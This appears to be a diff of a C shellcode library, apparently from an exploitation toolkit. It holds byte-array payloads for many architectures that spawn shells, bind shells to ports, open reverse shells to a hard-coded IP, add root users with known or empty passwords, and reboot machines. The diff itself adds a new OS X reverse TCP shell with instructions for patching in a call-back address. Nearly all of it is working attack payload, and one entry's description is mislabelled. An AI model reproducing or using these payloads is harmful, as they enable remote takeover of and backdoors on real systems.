@@ -35,7 +35,7 @@
 
 linux_selfsigstop:
 	push RET
- 	/* 68 34 de 04 08 */
+	/* 68 34 de 04 08 */
         pusha
         mov $20, %eax
         int $0x80
@@ -321,7 +321,7 @@ unsigned char ppc_osx_binsh[] =
    "\x38\x0a\xfe\x91\x44\xff\xff\x02"
    "\x2f\x62\x69\x6e\x2f\x73\x68\x58";
 
-unsigned char ppc_osx_bind4444[] = 
+unsigned char ppc_osx_bind4444[] =
    "\x38\x60\x00\x02\x38\x80\x00\x01\x38\xa0\x00\x06\x38\x00\x00"
    "\x61\x44\x00\x00\x02\x7c\x00\x02\x78\x7c\x7e\x1b\x78\x48\x00"
    "\x00\x0d\x00\x02\x11\x5c\x00\x00\x00\x00\x7c\x88\x02\xa6\x38"
@@ -338,7 +338,7 @@ unsigned char ppc_osx_bind4444[] =
    "\x3b\x7c\x00\x04\xac\x44\x00\x00\x02\x7c\x00\x02\x78\x7f\xe0"
    "\x00\x08\x2f\x62\x69\x6e\x2f\x63\x73\x68\x00\x00\x00\x00";
 
-unsigned char x86_w32_bind4444[] = 
+unsigned char x86_w32_bind4444[] =
 "\x29\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x9f"
 "\x2a\xdf\x1b\x83\xeb\xfc\xe2\xf4\x63\x40\x34\x56\x77\xd3\x20\xe4"
 "\x60\x4a\x54\x77\xbb\x0e\x54\x5e\xa3\xa1\xa3\x1e\xe7\x2b\x30\x90"
@@ -481,14 +481,14 @@ unsigned char x86_netbsd_binsh[] =
    "\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01"
    "\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";
 
-unsigned char x86_osx_binsh[] = 
+unsigned char x86_osx_binsh[] =
 	"\x31\xdb\x6a\x3b\x58\x53\xeb\x18\x5f"
 	"\x57\x53\x54\x54\x57\x6a\xff\x88\x5f"
 	"\x07\x89\x5f\xf5\x88\x5f\xfa\x9a\xff"
 	"\xff\xff\xff\x2b\xff\xe8\xe3\xff\xff"
 	"\xff/bin/shX";
 
-unsigned char x86_osx_binsh2[] = 
+unsigned char x86_osx_binsh2[] =
     "\x99\x52\x68\x2f\x2f\x73\x68\x68"
     "\x2f\x62\x69\x6e\x89\xe3\x52\x54"
     "\x54\x53\x53\x8d\x42\x3b\xcd\x80";
@@ -500,7 +500,7 @@ unsigned char x86_osx_bind4444[] =
    "\x08\xfe\x1c\x27\x94\x2d\xd7\xde\xad\x26\x48\x34\x75\x14\x48\x34"
    "\x97\x2d\xd7\x04\xdb\xb3\x05\x23\xaf\x7c\xdc\xde\x9f\x26\xd4\xe3"
    "\x94\xb3\x05\xfd\xca\xf7\x74\x4b\x3a\x81\xd5\xdc\xea\x51\xf6\xdc"
-   "\xad\x51\xe7\xdd\xab\xf7\x66\xe4\x91\x2a\xd6\xe7\x75\x45\x48\x34";  
+   "\xad\x51\xe7\xdd\xab\xf7\x66\xe4\x91\x2a\xd6\xe7\x75\x45\x48\x34";
 
 char x86_linux_binsh3[] =
 	"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07"
@@ -524,7 +524,7 @@ char *arm_linux_thumb="\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0c\x30\xc0\x46\
 char arm_linux_binsh[]= "\x02\x20\x42\xe0\x1c\x30\x8f\xe2\x04\x30\x8d\xe5"
    "\x08\x20\x8d\xe5\x13\x02\xa0\xe1\x07\x20\xc3\xe5\x04\x30\x8f\xe2"
    "\x04\x10\x8d\xe2\x01\x20\xc3\xe5\x0b\x0b\x90\xef/bin/sh";
-char arm_linux_suidsh[]= 
+char arm_linux_suidsh[]=
    "\x02\x20\x42\xe0\x04\x10\x8f\xe2\x12\x02\xa0\xe1\x01\x20\xc1\xe5\x17\x0b\x90\xef"
    "\x02\x20\x42\xe0\x1c\x30\x8f\xe2\x04\x30\x8d\xe5" // shellcode
    "\x08\x20\x8d\xe5\x13\x02\xa0\xe1\x07\x20\xc3\xe5\x04\x30\x8f\xe2"
@@ -546,12 +546,12 @@ unsigned long armle_osx_reverse[]= {
   0xe3a00002, 0xe3a01001, 0xe3a02006, 0xe3a0c061, 0xef000080, 0xe1a0a000, 0xeb000001,
 	0x5c110200, //# port 4444
 	0x8700a8c0, //# host 192.168.0.135
-	0xe1a0000a, 0xe1a0100e, 0xe3a02010, 0xe3a0c062, 0xef000080, 
-	0xe3a05002, 0xe3a0c05a, 0xe1a0000a, 0xe1a01005, 0xef000080, 
-	0xe2455001, 0xe3550000, 0xaafffff8, 0xe3a00000, 0xe3a01001, 
+	0xe1a0000a, 0xe1a0100e, 0xe3a02010, 0xe3a0c062, 0xef000080,
+	0xe3a05002, 0xe3a0c05a, 0xe1a0000a, 0xe1a01005, 0xef000080,
+	0xe2455001, 0xe3550000, 0xaafffff8, 0xe3a00000, 0xe3a01001,
 	0xe3a0c07e, 0xef000080, 0xe0455005, 0xe1a0600d, 0xe24dd020,
-	0xe28f0014, 0xe4860000, 0xe5865004, 0xe1a01006, 0xe3a02000, 
-	0xe3a0c03b, 0xef000080, 
+	0xe28f0014, 0xe4860000, 0xe5865004, 0xe1a01006, 0xe3a02000,
+	0xe3a0c03b, 0xef000080,
 	//# /bin/sh
 	0x6e69622f, 0x0068732f };
 unsigned char x64_linux_binsh[] =
@@ -572,40 +572,40 @@ unsigned char x86_bsdlinux_binsh[] = // by dymitrii
   "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50"
   "\x8c\xe0\x21\xc0\x74\x04\xb0\x3b\xeb\x07\xb0\x0b\x99\x52\x53\x89\xe1\xcd\x80";
 
-char x86_solaris_binsh[] = 
-"\xeb\x33\x5e\x8d\x06\x29\xc9\x89\xf3\x89\x5e\x08\xb1\x07\x80\x03\x20"      
-"\x43"              
-"\xe0\xfa"          
-"\x93"              
-"\x29\xc0"          
-"\x89\x5e\x0b"      
-"\x29\xd2"          
-"\x88\x56\x19"      
-"\x89\x56\x07"      
-"\x89\x56\x0f"      
-"\x89\x56\x14"      
-"\xb0\x3b"          
-"\x8d\x4e\x0b"      
-"\x89\xca"          
-"\x52"              
-"\x51"              
-"\x53"              
-"\x50"              
-"\xeb\x18"          
-"\xe8\xc8\xff\xff\xff"         
-"\x0f\x42\x49\x4e\x0f\x53\x48" 
+char x86_solaris_binsh[] =
+"\xeb\x33\x5e\x8d\x06\x29\xc9\x89\xf3\x89\x5e\x08\xb1\x07\x80\x03\x20"
+"\x43"
+"\xe0\xfa"
+"\x93"
+"\x29\xc0"
+"\x89\x5e\x0b"
+"\x29\xd2"
+"\x88\x56\x19"
+"\x89\x56\x07"
+"\x89\x56\x0f"
+"\x89\x56\x14"
+"\xb0\x3b"
+"\x8d\x4e\x0b"
+"\x89\xca"
+"\x52"
+"\x51"
+"\x53"
+"\x50"
+"\xeb\x18"
+"\xe8\xc8\xff\xff\xff"
+"\x0f\x42\x49\x4e\x0f\x53\x48"
 "\x01\x01\x01\x01\x02\x02\x02\x02\x03\x03\x03\x03"
 "\x9a\x04\x04\x04\x04\x07\x04";
 
 
-unsigned char x86_solaris_binshu[] = 
+unsigned char x86_solaris_binshu[] =
 "\xeb\x33\x5e\x8d\x06\x29\xc9\x89\xf3\x89\x5e\x08\xb1\x07\x80\x03\x20\x43\xe0\xfa"
 "\x93\x29\xc0\x89\x5e\x0b\x29\xd2\x88\x56\x19\x89\x56\x07\x89\x56\x0f\x89\x56\x14"
 "\xb0\x3b\x8d\x4e\x0b\x89\xca\x52\x51\x53\x50\xeb\x18\xe8\xc8\xff\xff\xff"
 "\x0f\x42\x49\x4e\x0f\x53\x48"            /* /bin/sh -= 0x20          */
 "\x01\x01\x01\x01\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";
 
-unsigned char ppc_osx_binsh0[] = 
+unsigned char ppc_osx_binsh0[] =
 "\x7c\xa5\x2a\x79\x40\x82\xff\xfd\x7d\x68\x02\xa6\x3b\xeb\x01\x71\x39\x40\x01\x71"
 "\x39\x1f\xfe\xce\x7c\xa8\x29\xae\x38\x7f\xfe\xc7\x90\x61\xff\xf8\x90\xa1\xff\xfc"
 "\x38\x81\xff\xf8\x38\x0a\xfe\xca\x44\xff\xff\x02\x60\x60\x60\x60\x38\x0a\xfe\x90"
@@ -742,15 +742,15 @@ char x86_ppc_linux_binsh[] =
 "\x73\x68\x68\x2f\x62\x69\x6e\x54"
 "\x5b\x52\x53\x54\x59\x0f\x34";
 
-char x86_ppc_osx_binsh[] = 
+char x86_ppc_osx_binsh[] =
 //
-// These four bytes work out to the following instruction 
+// These four bytes work out to the following instruction
 // in ppc arch: "rlwnm   r16,r28,r29,13,4", which will
 // basically do nothing on osx/ppc.
-// 
-// However on x86 architecture the four bytes are 3 
+//
+// However on x86 architecture the four bytes are 3
 // instructions:
-// 
+//
 // "push/nop/jmp"
 //
 // In this way, execution will be taken to the x86 shellcode
@@ -846,64 +846,79 @@ char x64_osx_suidsh[] =
 	"\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff\x2f\x62\x69\x6e\x2f"
 	"\x2f\x73\x68";
 
-
+/* OSX reverse tcp shell (131 bytes)
+ * replace FFFFFFFF around byte 43 with the call back ip in hex
+ * replace 5C11 around byte 39 with a new port current is 4444
+ * http://hammackj.com/2011/04/28/osx-x64-reverse-tcp-shellcode/
+ */
+char x64_osx_reverse_tcp[] =
+	"\x41\xB0\x02\x49\xC1\xE0\x18\x49\x83\xC8\x61\x4C\x89\xC0\x48"
+	"\x31\xD2\x48\x89\xD6\x48\xFF\xC6\x48\x89\xF7\x48\xFF\xC7\x0F"
+	"\x05\x49\x89\xC4\x49\xBD\x01\x01\x11\x5C\xFF\xFF\xFF\xFF\x41"
+	"\xB1\xFF\x4D\x29\xCD\x41\x55\x49\x89\xE5\x49\xFF\xC0\x4C\x89"
+	"\xC0\x4C\x89\xE7\x4C\x89\xEE\x48\x83\xC2\x10\x0F\x05\x49\x83"
+	"\xE8\x08\x48\x31\xF6\x4C\x89\xC0\x4C\x89\xE7\x0F\x05\x48\x83"
+	"\xFE\x02\x48\xFF\xC6\x76\xEF\x49\x83\xE8\x1F\x4C\x89\xC0\x48"
+	"\x31\xD2\x49\xBD\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x49\xC1\xED"
+	"\x08\x41\x55\x48\x89\xE7\x48\x31\xF6\x0F\x05";
 
 #define ENTRY(a,b,c,x,y,z) { .name=x, .desc=z, .data=(unsigned char *)&y, .len=sizeof(y)-1, \
 	.cmd=a, .host=b, .port=c },
 #define ENTRY_NULL() { NULL, NULL, NULL, 0 }
 
 struct shellcode_t shellcodes[] = {
- ENTRY(0,0,0,"arm.linux.adduser",     arm_linux_adduser,        "Adds root user 'shell-storm' with password 'toor'" )
- ENTRY(0,0,0,"arm.linux.binsh",       arm_linux_binsh,          "Runs /bin/sh" )
- ENTRY(0,0,0,"arm.linux.thumb",       arm_linux_thumb,          "Runs /bin/sh using thumb mode trick" )
- ENTRY(0,0,0,"arm.linux.suidsh",      arm_linux_suidsh,         "Setuid and runs /bin/sh" )
- ENTRY(0,0,0,"arm.linux.bind",        arm_linux_bind,           "Binds /bin/sh to a tcp port" )
- ENTRY(0,0,30,"armle.osx.reverse",    armle_osx_reverse,        "iPhone reverse connect shell to HOST and PORT" )
- ENTRY(0,0,0,"dual.linux.binsh",      x86_ppc_linux_binsh,      "x86/ppc MacOSX /bin/sh shellcode" )
- ENTRY(0,0,0,"dual.osx.binsh",        x86_ppc_osx_binsh,        "Runs /bin/sh (works also on x86) (dual)" )
- ENTRY(0,0,0,"mips.linux.binsh",      mips_linux_binsh,         "Runs /bin/sh (tested on loongson2f)." )
- ENTRY(0,0,0,"ppc.osx.adduser",       ppc_osx_adduser,          "Adds a root user named 'r00t' with no pass." )
- ENTRY(0,0,0,"ppc.osx.binsh",         ppc_osx_binsh,            "Executes /bin/sh" )
- ENTRY(0,0,0,"ppc.osx.binsh0",        ppc_osx_binsh0,           "Executes /bin/sh (with zeroes)" )
- ENTRY(0,0,0,"ppc.osx.bind4444",      ppc_osx_bind4444,         "Binds a shell at port 4444" )
- ENTRY(0,0,0,"ppc.osx.reboot",        ppc_osx_reboot,           "Reboots the box" )
- ENTRY(0,0,0,"ppc.bsd.binsh",         ppc_bsd_binsh,            "Runs /bin/sh" )
- ENTRY(0,0,0,"sparc.linux.binsh",  sparc_linux_binsh,     "Runs /bin/sh on sparc/linux" )
- ENTRY(0,0,0,"sparc.linux.bind4444",  sparc_linux_bind4444,     "Binds a shell at TCP port 4444" )
- ENTRY(0,0,0,"sparc.linux.binsh2",  sparc_linux_javicoder_binsh,     "Runs /bin/sh on sparc/linux (coder)" )
- ENTRY(0,0,0,"sparc.linux.bind1124",  sparc_linux_javicoder_portbind,     "Listen shell at 1124" )
- ENTRY(0,0,0,"sparc.linux.connect",  sparc_linux_javicoder_connect,     "Connects to 10.12.34.3 : 1124")
- //ENTRY(0,0,0,"ia64.linux.binsh",      ia64_linux_binsh,         "Executes /bin/sh on Intel Itanium" )
- ENTRY(0,0,0,"x64.linux.binsh",       x64_linux_binsh,          "Runs /bin/sh on 64 bits" )
- ENTRY(0,0,0,"x64.osx.suidsh",		  x64_osx_suidsh,			"Setuid(0) and runs /bin/sh")
- ENTRY(0,0,0,"x86.bsd.binsh",         x86_bsd_binsh,            "Executes /bin/sh" )
- ENTRY(0,0,0,"x86.bsd.binsh2",        x86_bsd_binsh2,           "Executes /bin/sh" )
- ENTRY(0,0,0,"x86.bsd.suidsh",        x86_bsd_suidsh,           "Setuid(0) and runs /bin/sh" )
- ENTRY(0,0,0,"x86.bsd.bind4444",      x86_bsd_bind4444,         "Binds a shell at port 4444" )
- ENTRY(0,0,0,"x86.bsdlinux.binsh",    x86_bsdlinux_binsh,       "Dual linux/bsd shellcode runs /bin/sh" )
- ENTRY(0,0,0,"x86.freebsd.reboot",    x86_freebsd_reboot,       "Reboots target box" )
- ENTRY(0,0,0,"x86.freebsd.reverse",   x86_freebsd_reverse,      "Reboots target box" )
- ENTRY(0,0,0,"x86.linux.adduser",     x86_linux_adduser,        "Adds user 'x' with password 'y'" )
- ENTRY(0,0,0,"x86.linux.bind4444",    x86_linux_bind4444,       "Binds a shell at TCP port 4444" )
- ENTRY(0,0,0,"x86.linux.binsh",       x86_linux_binsh,          "Executes /bin/sh" )
- ENTRY(0,0,0,"x86.linux.binsh1",      x86_linux_binsh1,          "Executes /bin/sh" )
- ENTRY(0,0,0,"x86.linux.binsh2",      x86_linux_binsh2,         "Executes /bin/sh" )
- ENTRY(43,0,0,"x86.linux.binsh3",     x86_linux_binsh3,         "Executes /bin/sh or CMD" )
- ENTRY(0,0,0,"x86.linux.udp4444",     x86_linux_udp4444,        "Binds a shell at UDP port 4444" )
- ENTRY(0,0,0,"x86.netbsd.binsh",      x86_netbsd_binsh,         "Executes /bin/sh" )
- ENTRY(0,0,0,"x86.openbsd.binsh",     x86_openbsd_binsh,        "Executes /bin/sh" )
- ENTRY(0,0,0,"x86.openbsd.bind6969",  x86_openbsd_bind6969,     "Executes /bin/sh" )
- ENTRY(0,0,0,"x86.osx.binsh",         x86_osx_binsh,            "Executes /bin/sh" )
- ENTRY(0,0,0,"x86.osx.binsh2",        x86_osx_binsh2,            "Executes /bin/sh" )
- ENTRY(0,0,0,"x86.osx.bind4444",      x86_osx_bind4444,         "Binds a shell at port 4444" )
- ENTRY(0,0,0,"x86.solaris.binsh",     x86_solaris_binsh,        "Runs /bin/sh" )
- ENTRY(0,0,0,"x86.solaris.binshu",    x86_solaris_binshu,       "Runs /bin/sh (toupper() safe)" )
- ENTRY(0,0,0,"x86.solaris.bind4444",  x86_solaris_bind4444,     "Binds a shell at port 4444" )
- ENTRY(0,0,0,"x86.w32.msg",           x86_w32_msg,              "Shows a MessageBox" )
- ENTRY(0,0,0,"x86.w32.cmd",           x86_w32_cmd_exit,         "Runs cmd.exe and ExitThread" )
- ENTRY(0,0,0,"x86.w32.adduser",       x86_w32_adduser,          "Adds user 'x' with password 'y'" )
- ENTRY(0,0,0,"x86.w32.bind4444",      x86_w32_bind4444,         "Binds a shell at port 4444" )
- ENTRY(0,0,0,"x86.w32.tcp4444",       x86_w32_tcp4444,          "Binds a shell at port 4444" )
+ ENTRY(0,0,0,"arm.linux.adduser",     arm_linux_adduser,               "Adds root user 'shell-storm' with password 'toor'" )
+ ENTRY(0,0,0,"arm.linux.binsh",       arm_linux_binsh,                 "Runs /bin/sh" )
+ ENTRY(0,0,0,"arm.linux.thumb",       arm_linux_thumb,                 "Runs /bin/sh using thumb mode trick" )
+ ENTRY(0,0,0,"arm.linux.suidsh",      arm_linux_suidsh,                "Setuid and runs /bin/sh" )
+ ENTRY(0,0,0,"arm.linux.bind",        arm_linux_bind,                  "Binds /bin/sh to a tcp port" )
+ ENTRY(0,0,30,"armle.osx.reverse",    armle_osx_reverse,               "iPhone reverse connect shell to HOST and PORT" )
+ ENTRY(0,0,0,"dual.linux.binsh",      x86_ppc_linux_binsh,             "x86/ppc MacOSX /bin/sh shellcode" )
+ ENTRY(0,0,0,"dual.osx.binsh",        x86_ppc_osx_binsh,               "Runs /bin/sh (works also on x86) (dual)" )
+ ENTRY(0,0,0,"mips.linux.binsh",      mips_linux_binsh,                "Runs /bin/sh (tested on loongson2f)." )
+ ENTRY(0,0,0,"ppc.osx.adduser",       ppc_osx_adduser,                 "Adds a root user named 'r00t' with no pass." )
+ ENTRY(0,0,0,"ppc.osx.binsh",         ppc_osx_binsh,                   "Executes /bin/sh" )
+ ENTRY(0,0,0,"ppc.osx.binsh0",        ppc_osx_binsh0,                  "Executes /bin/sh (with zeroes)" )
+ ENTRY(0,0,0,"ppc.osx.bind4444",      ppc_osx_bind4444,                "Binds a shell at port 4444" )
+ ENTRY(0,0,0,"ppc.osx.reboot",        ppc_osx_reboot,                  "Reboots the box" )
+ ENTRY(0,0,0,"ppc.bsd.binsh",         ppc_bsd_binsh,                   "Runs /bin/sh" )
+ ENTRY(0,0,0,"sparc.linux.binsh",     sparc_linux_binsh,               "Runs /bin/sh on sparc/linux" )
+ ENTRY(0,0,0,"sparc.linux.bind4444",  sparc_linux_bind4444,            "Binds a shell at TCP port 4444" )
+ ENTRY(0,0,0,"sparc.linux.binsh2",    sparc_linux_javicoder_binsh,     "Runs /bin/sh on sparc/linux (coder)" )
+ ENTRY(0,0,0,"sparc.linux.bind1124",  sparc_linux_javicoder_portbind,  "Listen shell at 1124" )
+ ENTRY(0,0,0,"sparc.linux.connect",   sparc_linux_javicoder_connect,   "Connects to 10.12.34.3 : 1124")
+ //ENTRY(0,0,0,"ia64.linux.binsh",      ia64_linux_binsh,                "Executes /bin/sh on Intel Itanium" )
+ ENTRY(0,0,0,"x64.linux.binsh",       x64_linux_binsh,                 "Runs /bin/sh on 64 bits" )
+ ENTRY(0,0,0,"x64.osx.suidsh",        x64_osx_suidsh,                  "Setuid(0) and runs /bin/sh")
+ ENTRY(0,43,39,"x64.osx.reverse",     x64_osx_reverse_tcp,             "OSX reverse connect shell")
+ ENTRY(0,0,0,"x86.bsd.binsh",         x86_bsd_binsh,                   "Executes /bin/sh" )
+ ENTRY(0,0,0,"x86.bsd.binsh2",        x86_bsd_binsh2,                  "Executes /bin/sh" )
+ ENTRY(0,0,0,"x86.bsd.suidsh",        x86_bsd_suidsh,                  "Setuid(0) and runs /bin/sh" )
+ ENTRY(0,0,0,"x86.bsd.bind4444",      x86_bsd_bind4444,                "Binds a shell at port 4444" )
+ ENTRY(0,0,0,"x86.bsdlinux.binsh",    x86_bsdlinux_binsh,              "Dual linux/bsd shellcode runs /bin/sh" )
+ ENTRY(0,0,0,"x86.freebsd.reboot",    x86_freebsd_reboot,              "Reboots target box" )
+ ENTRY(0,0,0,"x86.freebsd.reverse",   x86_freebsd_reverse,             "Reboots target box" )
+ ENTRY(0,0,0,"x86.linux.adduser",     x86_linux_adduser,               "Adds user 'x' with password 'y'" )
+ ENTRY(0,0,0,"x86.linux.bind4444",    x86_linux_bind4444,              "Binds a shell at TCP port 4444" )
+ ENTRY(0,0,0,"x86.linux.binsh",       x86_linux_binsh,                 "Executes /bin/sh" )
+ ENTRY(0,0,0,"x86.linux.binsh1",      x86_linux_binsh1,                "Executes /bin/sh" )
+ ENTRY(0,0,0,"x86.linux.binsh2",      x86_linux_binsh2,                "Executes /bin/sh" )
+ ENTRY(43,0,0,"x86.linux.binsh3",     x86_linux_binsh3,                "Executes /bin/sh or CMD" )
+ ENTRY(0,0,0,"x86.linux.udp4444",     x86_linux_udp4444,               "Binds a shell at UDP port 4444" )
+ ENTRY(0,0,0,"x86.netbsd.binsh",      x86_netbsd_binsh,                "Executes /bin/sh" )
+ ENTRY(0,0,0,"x86.openbsd.binsh",     x86_openbsd_binsh,               "Executes /bin/sh" )
+ ENTRY(0,0,0,"x86.openbsd.bind6969",  x86_openbsd_bind6969,            "Executes /bin/sh" )
+ ENTRY(0,0,0,"x86.osx.binsh",         x86_osx_binsh,                   "Executes /bin/sh" )
+ ENTRY(0,0,0,"x86.osx.binsh2",        x86_osx_binsh2,                  "Executes /bin/sh" )
+ ENTRY(0,0,0,"x86.osx.bind4444",      x86_osx_bind4444,                "Binds a shell at port 4444" )
+ ENTRY(0,0,0,"x86.solaris.binsh",     x86_solaris_binsh,               "Runs /bin/sh" )
+ ENTRY(0,0,0,"x86.solaris.binshu",    x86_solaris_binshu,              "Runs /bin/sh (toupper() safe)" )
+ ENTRY(0,0,0,"x86.solaris.bind4444",  x86_solaris_bind4444,            "Binds a shell at port 4444" )
+ ENTRY(0,0,0,"x86.w32.msg",           x86_w32_msg,                     "Shows a MessageBox" )
+ ENTRY(0,0,0,"x86.w32.cmd",           x86_w32_cmd_exit,                "Runs cmd.exe and ExitThread" )
+ ENTRY(0,0,0,"x86.w32.adduser",       x86_w32_adduser,                 "Adds user 'x' with password 'y'" )
+ ENTRY(0,0,0,"x86.w32.bind4444",      x86_w32_bind4444,                "Binds a shell at port 4444" )
+ ENTRY(0,0,0,"x86.w32.tcp4444",       x86_w32_tcp4444,                 "Binds a shell at port 4444" )
  ENTRY_NULL()
 };
 
